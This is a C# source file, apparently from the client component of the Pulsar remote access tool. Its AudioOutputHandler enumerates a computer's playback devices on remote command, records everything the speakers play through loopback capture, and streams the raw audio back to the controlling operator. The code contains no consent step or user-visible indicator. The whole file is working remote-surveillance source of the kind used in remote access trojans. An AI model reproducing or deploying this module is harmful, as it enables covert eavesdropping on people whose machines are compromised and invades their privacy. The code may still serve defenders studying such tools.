using NAudio.CoreAudioApi;
using NAudio.Wave;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Audio;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Client.Messages
{
    public class AudioOutputHandler : NotificationMessageProcessor, IDisposable
    {
        public override bool CanExecute(IMessage message) => message is GetOutput ||
                                                             message is GetOutputDevice;

        public override bool CanExecuteFrom(ISender sender) => true;

        public ISender _client;

        private bool _isStarted;

        public WasapiLoopbackCapture _audioDevice;

        private int _deviceID;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetOutput msg:
                    Execute(sender, msg);
                    break;

                case GetOutputDevice msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetOutput message)
        {
            if (message.CreateNew)
            {
                try
                {
                    _isStarted = false;
                    _audioDevice?.Dispose();
                    OnReport("Speaker audio streaming started");
                }
                catch (Exception ex)
                {
                    OnReport($"Error during audio device cleanup: {ex.Message}");
                }
            }
            if (message.Destroy)
            {
                try
                {
                    Destroy();
                    OnReport("Speaker audio streaming stopped");
                }
                catch (Exception ex)
                {
                    OnReport($"Error stopping speaker audio: {ex.Message}");
                }
                return;
            }
            if (_client == null) _client = client;
            if (!_isStarted)
            {
                try
                {
                    _deviceID = message.DeviceIndex;
                    var enumerator = new MMDeviceEnumerator();
                    var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

                    if (_deviceID < 0 || _deviceID >= devices.Count)
                    {
                        OnReport($"Invalid device index: {_deviceID}. Available devices: {devices.Count}");
                        enumerator.Dispose();
                        return;
                    }
                    var device = devices[_deviceID];
                    if (device == null)
                    {
                        OnReport($"Audio device at index {_deviceID} is null");
                        enumerator.Dispose();
                        return;
                    }

                    OnReport($"Initializing system audio device {_deviceID}: {device.FriendlyName}");

                    if (device.AudioClient?.MixFormat == null)
                    {
                        OnReport($"Audio device {_deviceID} has invalid audio client or format");
                        enumerator.Dispose();
                        return;
                    }

                    int sampleRate = message.Bitrate;
                    int channels = device.AudioClient.MixFormat.Channels;
                    var waveFormat = new WaveFormat(sampleRate, channels);

                    _audioDevice = new WasapiLoopbackCapture(device);
                    _audioDevice.WaveFormat = waveFormat;

                    _audioDevice.DataAvailable += sourcestream_DataAvailable;
                    _audioDevice.StartRecording();
                    _isStarted = true;

                    enumerator.Dispose();
                }
                catch (ArgumentOutOfRangeException ex)
                {
                    OnReport($"Device index out of range: {ex.Message}");
                    _isStarted = false;
                }
                catch (InvalidOperationException ex)
                {
                    OnReport($"Invalid audio operation: {ex.Message}");
                    _isStarted = false;
                }
                catch (System.Runtime.InteropServices.COMException ex)
                {
                    OnReport($"COM error accessing audio device: {ex.Message}");
                    _isStarted = false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    OnReport($"Unauthorized access to audio device: {ex.Message}");
                    _isStarted = false;
                }
                catch (Exception ex)
                {
                    OnReport($"Unexpected error initializing audio capture: {ex.Message}");
                    _isStarted = false;
                }
            }
        }

        private void sourcestream_DataAvailable(object sender, WaveInEventArgs e) //fix overheat
        {
            byte[] bufferCopy = new byte[e.BytesRecorded];
            Array.Copy(e.Buffer, bufferCopy, e.BytesRecorded);

            Task.Run(() =>
            {
                try
                {
                    _client.Send(new GetOutputResponse
                    {
                        Audio = bufferCopy,
                        Device = _deviceID
                    });
                }
                catch (Exception ex)
                {
                    OnReport($"Error sending audio data: {ex.Message}");
                }
            });
        }

        private void Execute(ISender client, GetOutputDevice message)
        {
            try
            {
                var deviceList = new List<Tuple<int, string>>();
                var enumerator = new MMDeviceEnumerator();
                var devices = enumerator.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active);

                for (int i = 0; i < devices.Count; i++)
                {
                    try
                    {
                        var deviceName = devices[i]?.FriendlyName;
                        if (!string.IsNullOrEmpty(deviceName))
                        {
                            OnReport($"Found system audio device {i}: {deviceName}");
                            deviceList.Add(Tuple.Create(i, deviceName));
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error accessing device {i}: {ex.Message}");
                    }
                }
                enumerator.Dispose();

                client.Send(new GetOutputDeviceResponse { DeviceInfos = deviceList });
            }
            catch (Exception ex)
            {
                OnReport($"Error enumerating audio devices: {ex.Message}");
                client.Send(new GetOutputDeviceResponse { DeviceInfos = new List<Tuple<int, string>>() });
            }
        }

        public void Destroy()
        {
            try
            {
                if (_audioDevice != null)
                {
                    try
                    {
                        _audioDevice.DataAvailable -= sourcestream_DataAvailable;
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error unsubscribing from DataAvailable event: {ex.Message}");
                    }

                    try
                    {
                        if (_audioDevice.CaptureState == CaptureState.Capturing)
                        {
                            _audioDevice.StopRecording();
                        }
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error stopping audio recording: {ex.Message}");
                    }

                    try
                    {
                        _audioDevice.Dispose();
                    }
                    catch (Exception ex)
                    {
                        OnReport($"Error disposing audio device: {ex.Message}");
                    }

                    _audioDevice = null;
                }
            }
            catch (Exception ex)
            {
                OnReport($"Error in Destroy method: {ex.Message}");
            }
            finally
            {
                _isStarted = false;
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    Destroy();
                }
                catch (Exception ex)
                {
                    OnReport($"Error during disposal: {ex.Message}");
                }
            }
        }
    }
}